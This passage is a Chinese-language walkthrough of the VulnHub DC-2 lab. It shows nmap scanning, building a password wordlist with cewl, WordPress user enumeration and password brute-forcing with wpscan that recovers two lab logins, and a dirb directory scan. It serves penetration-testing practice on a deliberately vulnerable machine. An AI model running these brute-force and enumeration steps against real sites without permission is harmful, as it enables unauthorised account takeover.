<center>DC-2</center>



[toc]





## DC-2

> vulnhub： [dc-2](https://www.vulnhub.com/entry/dc-2,311/)







### 1. 信息收集

```shell
# 扫描网段
nmap -sP 172.16.168.128/24

# 扫描靶机地址
nmap -p- 172.16.168.133 -A 
```

```shell
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Did not follow redirect to http://dc-2/
|_http-server-header: Apache/2.4.10 (Debian)
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
MAC Address: 00:0C:29:92:7A:9A (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# 开放了 80 apache   7744 ssh
```

> 第一次打开，跳转到`dc-2`域名。需要修改我们本地`hosts`

```shell
sudo vim /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
172.16.168.133  dc-2
```

> 有一个`flag`页面，提供一些信息
>
> `wordpress`搭建的平台。

```txt


Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
您常用的单词表可能不起作用，所以也许您只需要 cewl。
More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.

```

1. 工具`cewl`  [github](https://github.com/digininja/CeWL)

> CeWL 是一个爬虫工具，可以爬取指定网站的内容并生成自定义字典，常用于渗透测试中的密码破解。

```shell
# 安装
sudo apt install cewl

# 使用
cewl http://example.com
# 指定最小词长度为8，爬取深度为2层，并保存到文件
cewl http://example.com -m 8 -d 2 -w output.txt
# 包含邮箱地址
cewl http://example.com --email
```

```shell
# cewl 爬取网站信息，作为密码。
cewl http://dc-2/ > pass.txt

# 查看
cat pass.txt
```

2. 工具： `wpscan` [github](https://github.com/wpscanteam/wpscan)

> WPScan 这个专门用于扫描 WordPress 安全漏洞的工具：

```shell
# 安装
sudo apt install wpscan

# 枚举用户-e u
wpsacn --url url -e u

# 枚举插件  -e p
wpscan --url http://example.com -e p

# 对多个用户进行密码爆破 -U 用户 -P 密码
wpscan --url http://example.com -U users.txt -P passwords.txt
```

```shell
# 跑出三个用户
wpscan --url http://dc-2/ -e u

# cat user.txt
admin
jerry
tom

wpscan --url http://dc-2/  -U user.txt -P pass.txt

# 跑出两个用户名和密码
[SUCCESS] - jerry / adipiscing         
[SUCCESS] - tom / parturient 
```

3. 工具： `dirb`

> 网站目录扫描工具

```shell
sudo apt install dirb

# 使用
# 使用默认字典扫描
dirb http://example.com
# 指定字典扫描
dirb http://example.com /usr/share/wordlists/dirb/common.txt
```

```shell
dirb http://dc-2/

# 后台
==> DIRECTORY: http://dc-2/wp-admin/       
==> DIRECTORY: http://dc-2/wp-content/      
==> DIRECTORY: http://dc-2/wp-includes/
```

> 有一个`flag2`页面，提供一些信息

```shell
Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.

标记 2：

如果您无法利用 WordPress 并走捷径，还有其他方法。

希望您找到了另一个切入点。
```

